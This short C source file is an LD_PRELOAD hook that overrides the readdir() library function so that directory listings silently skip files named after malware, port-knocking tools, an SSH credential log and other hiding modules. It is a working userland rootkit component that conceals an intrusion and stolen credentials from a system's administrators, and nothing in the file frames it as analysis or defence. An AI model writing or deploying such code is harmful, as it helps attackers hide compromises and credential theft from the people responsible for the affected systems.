#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>

typedef struct dirent *(*orig_readdir_t)(DIR *);
orig_readdir_t orig_readdir = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "malware.so") || strstr(entry->d_name, "port_knock") || strstr(entry->d_name, "ssh_creds.log") || strstr(entry->d_name, "hide_connections.so") || strstr(entry->d_name, "hide_logs.so") || strstr(entry->d_name, "hide_files.so")) {
            continue;
        }
        return entry;
    }
    return NULL;
}
